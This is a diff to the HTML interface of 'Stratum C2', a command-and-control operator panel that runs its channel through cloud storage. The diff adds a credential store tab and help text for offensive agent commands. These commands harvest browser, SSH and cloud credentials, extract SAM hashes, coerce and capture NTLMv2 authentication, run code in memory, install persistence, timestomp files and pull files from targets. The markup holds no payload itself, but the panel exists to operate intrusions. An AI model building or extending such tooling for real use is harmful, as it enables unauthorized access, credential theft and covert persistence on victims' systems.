@@ -37,7 +37,7 @@
       </div>
       <div class="login-error" id="login-error"></div>
       <div class="login-footer">
-        <span>Stratum C2 v1.1</span>
+        <span id="login-version">Stratum C2 v1.1</span>
       </div>
     </div>
   </div>
@@ -68,7 +68,12 @@
         <span id="stat-operators-n">1 operator</span>
       </div>
     </div>
+    <div class="update-banner" id="update-banner" style="display:none">
+      <span class="update-banner-text" id="update-banner-text">Update available</span>
+      <button class="update-banner-btn" id="update-banner-btn">View</button>
+    </div>
     <div class="tb-right">
+      <div class="version-badge" id="version-badge"></div>
       <div class="srv-clock" id="srv-clock" title="Server time · click to configure">
         <div class="srv-clock-time" id="srv-clock-time">--<span class="ck">:</span>--<span class="ck">:</span>--</div>
         <div class="srv-clock-tz" id="srv-clock-tz">UTC</div>
@@ -105,6 +110,7 @@
       </span>
     </div>
     <div class="sessions-table-wrap">
+      <div class="sess-empty-msg" id="sess-empty-msg">No active sessions · deploy an agent to get started</div>
       <table class="sess" id="sess-table">
         <thead>
           <tr>
@@ -125,11 +131,6 @@
           </tr>
         </thead>
         <tbody id="sess-tbody">
-          <tr id="sess-empty-row">
-            <td colspan="14" style="text-align:center;padding:1.4rem;color:var(--text-muted);font-size:.74rem">
-              No active sessions · deploy an agent to get started
-            </td>
-          </tr>
         </tbody>
       </table>
     </div>
@@ -162,6 +163,8 @@
             <span class="listen-badge-dot"></span>
             <span class="listen-badge-label">Listen</span>
           </span>
+          <span class="version-warn" id="version-mismatch-warn" style="display:none" title="">⚠ Agent outdated</span>
+          <button class="btn-lock-toggle unlocked" id="btn-lock-toggle" title="Lock session — prevent kill/stop/delete">🔓 Lock</button>
           <button class="btn-poll-toggle stopping" id="btn-poll-toggle" title="Stop Dropbox polling for this session">■ Stop Poll</button>
         </div>
         <div class="sh-r2" id="sh-meta"></div>
@@ -180,6 +183,7 @@
         <div class="tab" data-tab="history">History</div>
         <div class="tab" data-tab="artifacts">Artifacts</div>
         <div class="tab" data-tab="persist">Persistence</div>
+        <div class="tab" data-tab="creds">Credentials</div>
         <div class="tab" data-tab="control">Control</div>
         <div class="tab" data-tab="info">Info</div>
       </div>
@@ -231,7 +235,7 @@
                 <th>Size</th>
                 <th>MD5</th>
                 <th>Downloaded</th>
-                <th style="text-align:right">Actions</th>
+                <th style="text-align:center;min-width:180px">Actions</th>
               </tr></thead>
               <tbody id="artifacts-tbody">
                 <tr><td colspan="6" class="ts" style="text-align:center;padding:1.2rem">No files downloaded for this session</td></tr>
@@ -257,6 +261,32 @@
         <!-- Persist -->
         <div class="tab-pane" id="tp-persist">
           <div class="persist-inner" id="persist-inner"></div>
+        </div>
+
+        <!-- Credentials -->
+        <div class="tab-pane" id="tp-creds">
+          <div class="tab-toolbar">
+            <button class="btn-sm btn-sm-accent" id="btn-cred-add" title="Add credential manually">+ Add</button>
+            <span class="cred-count" id="cred-count"></span>
+          </div>
+          <div class="tab-inner">
+            <table class="data-tbl" id="creds-tbl">
+              <thead><tr>
+                <th>Source</th>
+                <th>Protocol</th>
+                <th>Host</th>
+                <th>Domain</th>
+                <th>Notes</th>
+                <th>Username</th>
+                <th>Secret</th>
+                <th style="text-align:center">Type</th>
+                <th style="text-align:center;min-width:150px;width:150px">Actions</th>
+              </tr></thead>
+              <tbody id="creds-tbody">
+                <tr><td colspan="9" class="ts" style="text-align:center;padding:1.2rem">No credentials captured</td></tr>
+              </tbody>
+            </table>
+          </div>
         </div>
 
         <!-- Control -->
@@ -373,6 +403,63 @@
     </div>
     <div class="modal-footer" id="wipe-progress-footer" style="display:none">
       <button class="btn-primary" id="wipe-progress-close">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- Credential Add/Edit -->
+<div class="modal-overlay" id="cred-modal">
+  <div class="modal modal-sm">
+    <div class="modal-header">
+      <span class="modal-title" id="cred-modal-title">Add Credential</span>
+      <button class="modal-close" onclick="Modal.close('cred-modal')">×</button>
+    </div>
+    <div class="modal-body" style="padding:.9rem 1.1rem">
+      <input type="hidden" id="cred-edit-id">
+      <div class="cred-form-grid">
+        <label>Username *</label><input id="cred-f-user" placeholder="admin">
+        <label>Secret *</label><input id="cred-f-secret" placeholder="hash or password">
+        <label>Type</label>
+        <select id="cred-f-type">
+          <option value="password">Password</option>
+          <option value="ntlmv2">NTLMv2 Hash</option>
+          <option value="ntlm">NTLM Hash</option>
+          <option value="hash">Hash (shadow/other)</option>
+          <option value="basic">HTTP Basic</option>
+          <option value="kerberos">Kerberos TGT</option>
+          <option value="ssh_key">SSH Key</option>
+          <option value="token">Token / API Key</option>
+          <option value="cookie">Cookie / Session</option>
+          <option value="other">Other</option>
+        </select>
+        <label>Source</label><input id="cred-f-source" placeholder="manual, harvest, sam, listen…">
+        <label>Domain</label><input id="cred-f-domain" placeholder="CORP">
+        <label>Protocol</label><input id="cred-f-proto" placeholder="smb, rdp, ssh, http…">
+        <label>Host</label><input id="cred-f-host" placeholder="10.0.0.5">
+        <label>Port</label><input id="cred-f-port" placeholder="445">
+        <label>Notes</label><input id="cred-f-notes" placeholder="optional notes">
+      </div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn-sm btn-sm-ghost" onclick="Modal.close('cred-modal')">Cancel</button>
+      <button class="btn-sm btn-sm-accent" id="cred-save">Save</button>
+    </div>
+  </div>
+</div>
+
+<!-- Credential Detail (Show) -->
+<div class="modal-overlay" id="cred-show-modal">
+  <div class="modal modal-sm">
+    <div class="modal-header">
+      <span class="modal-title">Credential Detail</span>
+      <button class="modal-close" onclick="Modal.close('cred-show-modal')">×</button>
+    </div>
+    <div class="modal-body" style="padding:.9rem 1.1rem">
+      <div class="cred-detail-grid" id="cred-detail-grid"></div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn-sm btn-sm-ghost" onclick="Modal.close('cred-show-modal')">Close</button>
+      <button class="btn-sm btn-sm-accent" id="cred-detail-copy">Copy Secret</button>
     </div>
   </div>
 </div>
@@ -532,15 +619,52 @@
           <div class="help-cmd-row"><code>/sleep &lt;s&gt;</code><span>Set check-in interval in seconds (1 – 86400)</span></div>
           <div class="help-cmd-row"><code>/jitter &lt;pct&gt;</code><span>Randomise interval ± pct% (0 – 50)</span></div>
           <div class="help-cmd-row"><code>/download &lt;path&gt;</code><span>Pull file from target — appears in Artifacts tab</span></div>
-          <div class="help-cmd-row"><code>/upload [dest]</code><span>Push local file to agent; dest defaults to /tmp</span></div>
+          <div class="help-cmd-row"><code>/upload [dest]</code><span>Push local file to agent; dest defaults to CWD</span></div>
           <div class="help-cmd-row"><code>/timestomp &lt;tgt&gt; &lt;ref&gt;</code><span>Copy timestamps from ref file onto target file</span></div>
-          <div class="help-cmd-row"><code>/persist probe</code><span>Probe all techniques and show status (non-invasive) — or use the Persist tab</span></div>
+        </div>
+      </div>
+
+      <div class="help-block" style="margin-top:.75rem">
+        <div class="help-block-title">Persistence</div>
+        <div class="help-cmd-grid">
+          <div class="help-cmd-row"><code>/persist probe</code><span>Probe all techniques — non-invasive feasibility audit</span></div>
           <div class="help-cmd-row"><code>/persist install &lt;id&gt;</code><span>Install a persistence technique by ID</span></div>
           <div class="help-cmd-row"><code>/persist remove &lt;id&gt;</code><span>Remove a persistence technique by ID</span></div>
-          <div class="help-cmd-row"><code>/persist status &lt;id&gt;</code><span>Check status of a specific technique</span></div>
+          <div class="help-cmd-row"><code>/persist status &lt;id&gt;</code><span>Check current status of a specific technique</span></div>
+          <div class="help-cmd-row"><code>/persist check</code><span>Re-check all installed techniques</span></div>
+        </div>
+      </div>
+
+      <div class="help-block" style="margin-top:.75rem">
+        <div class="help-block-title">Credential Harvesting</div>
+        <div class="help-cmd-grid">
+          <div class="help-cmd-row"><code>/creds harvest</code><span>Collect creds — Firefox, SSH, FileZilla, mRemoteNG, PS history, Git, cloud tokens</span></div>
+          <div class="help-cmd-row"><code>/creds harvest decrypt</code><span>Also decrypt Chrome/Edge/DPAPI via CryptUnprotectData (Win)</span></div>
+          <div class="help-cmd-row"><code>/creds coerce</code><span>Force local auth to capture NTLMv2 / SSH agent</span></div>
+          <div class="help-cmd-row"><code>/creds sam</code><span>In-memory SAM hash extraction (Win, SYSTEM or elevated admin)</span></div>
+          <div class="help-cmd-row"><code>/creds listen start &lt;proto:port&gt;</code><span>Start listener — smb:445, http:80 (Basic), http-ntlm:80 (NTLMv2)</span></div>
+          <div class="help-cmd-row"><code>/creds listen stop [proto:port]</code><span>Stop all listeners, or a specific one</span></div>
+          <div class="help-cmd-row"><code>/creds listen dump</code><span>Dump captured credentials + poisoner stats</span></div>
+        </div>
+      </div>
+
+      <div class="help-block" style="margin-top:.75rem">
+        <div class="help-block-title">In-Memory Execution</div>
+        <div class="help-cmd-grid">
+          <div class="help-cmd-row"><code>/bof &lt;file.obj&gt; [args]</code><span>Execute BOF/COFF object in-memory (Win)</span></div>
+          <div class="help-cmd-row"><code>/assembly &lt;file.exe&gt; [args]</code><span>Execute .NET assembly in-memory via CLR (Win)</span></div>
+          <div class="help-cmd-row"><code>/memexec &lt;file.elf&gt; [args]</code><span>Execute ELF in-memory via memfd_create (Linux)</span></div>
+        </div>
+      </div>
+
+      <div class="help-block" style="margin-top:.75rem">
+        <div class="help-block-title">Session Control</div>
+        <div class="help-cmd-grid">
           <div class="help-cmd-row"><code>/kill</code><span>Wipe agent files on target and terminate process</span></div>
           <div class="help-cmd-row"><code>/stop</code><span>Terminate agent process, leave files on disk</span></div>
+          <div class="help-cmd-row"><code>/history</code><span>Switch to History tab</span></div>
           <div class="help-cmd-row"><code>/clear</code><span>Clear Shell output pane</span></div>
+          <div class="help-cmd-row"><code>/help</code><span>Open this reference</span></div>
         </div>
       </div>
 
@@ -553,8 +677,9 @@
           <div class="help-tab-row"><span class="htr-name">History</span><span>Full command log, filterable, exportable to XLSX</span></div>
           <div class="help-tab-row"><span class="htr-name">Artifacts</span><span>Exfiltrated files, on-target artifacts, uploads</span></div>
           <div class="help-tab-row"><span class="htr-name">Persistence</span><span>Multi-technique persistence engine — probe, install, remove</span></div>
+          <div class="help-tab-row"><span class="htr-name">Credentials</span><span>Auto-populated credential store from harvest/sam/listen</span></div>
           <div class="help-tab-row"><span class="htr-name">Control</span><span>Sleep, jitter, kill — agent lifecycle</span></div>
-          <div class="help-tab-row"><span class="htr-name">Info</span><span>Session metadata, channel paths, crypto material</span></div>
+          <div class="help-tab-row"><span class="htr-name">Info</span><span>Session profile, channel paths, deploy config, guardrails</span></div>
         </div>
 
         <div class="help-block">
@@ -745,6 +870,17 @@
         </div>
       </div>
       <div id="srv-tz-msg" style="font-size:.8rem;min-height:1.1em"></div>
+      <div class="form-sep"></div>
+      <div class="form-group">
+        <label>Auto-Update</label>
+        <p class="text-dim" style="margin:.3rem 0 .6rem;font-size:.8rem">
+          Check for new versions on startup and notify operators.
+        </p>
+        <label class="toggle-row">
+          <input type="checkbox" id="srv-autoupdate-cb">
+          <span>Check for updates automatically</span>
+        </label>
+      </div>
     </div>
     <div class="modal-footer">
       <button class="btn-primary" id="srv-tz-save">Apply Timezone</button>
@@ -764,7 +900,7 @@
       <div class="about-hero">
         <div class="about-logo-wrap"><img src="/assets/icon.webp" alt="Stratum C2"></div>
         <div class="about-name">Stratum C2</div>
-        <div class="about-ver">v1.1 — Cloud Persistence Framework</div>
+        <div class="about-ver" id="about-version">v1.1 — Cloud Persistence Framework</div>
       </div>
       <div class="about-desc">
         Dead-drop C2 channel via cloud storage providers.<br>
@@ -785,7 +921,57 @@
       </div>
     </div>
     <div class="modal-footer">
+      <button class="btn-secondary" id="about-changelog-btn">View Changelog</button>
       <button class="btn-primary" onclick="Modal.close('about-modal')">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- Update Modal -->
+<div class="modal-overlay" id="update-modal">
+  <div class="modal modal-sm">
+    <div class="modal-header">
+      <span class="modal-title">Update Available</span>
+      <button class="modal-close" onclick="Modal.close('update-modal')">×</button>
+    </div>
+    <div class="modal-body">
+      <div class="update-info">
+        <div class="update-versions">
+          <span class="update-current" id="update-current">v—</span>
+          <span class="update-arrow">→</span>
+          <span class="update-latest" id="update-latest">v—</span>
+        </div>
+        <div class="update-date" id="update-date"></div>
+      </div>
+      <div class="update-warn">
+        <span class="update-warn-icon">⚠</span>
+        <span>Updating the server may break compatibility with deployed agents. Sessions deployed on an older version might stop responding until re-deployed.</span>
+      </div>
+      <div class="update-notes" id="update-notes"></div>
+      <div class="update-progress" id="update-progress" style="display:none">
+        <div class="update-progress-text" id="update-progress-text">Applying update…</div>
+      </div>
+    </div>
+    <div class="modal-footer" id="update-footer">
+      <button class="btn-secondary" id="update-dismiss-btn">Don't Ask Again</button>
+      <button class="btn-secondary" id="update-later-btn">Remind Me Later</button>
+      <button class="btn-primary" id="update-apply-btn">Update Now</button>
+    </div>
+  </div>
+</div>
+
+<!-- Changelog Modal -->
+<div class="modal-overlay" id="changelog-modal">
+  <div class="modal" style="max-width:600px">
+    <div class="modal-header">
+      <span class="modal-title">Changelog</span>
+      <button class="modal-close" onclick="Modal.close('changelog-modal')">×</button>
+    </div>
+    <div class="modal-body">
+      <div class="changelog-content" id="changelog-content">Loading…</div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn-primary" onclick="Modal.close('changelog-modal')">Close</button>
     </div>
   </div>
 </div>
@@ -941,6 +1127,7 @@
 <script src="/js/chat.js"></script>
 <script src="/js/tradecraft.js"></script>
 <script src="/js/notif.js"></script>
+<script src="/js/contextmenu.js"></script>
 <script src="/js/app.js"></script>
 
 </body>
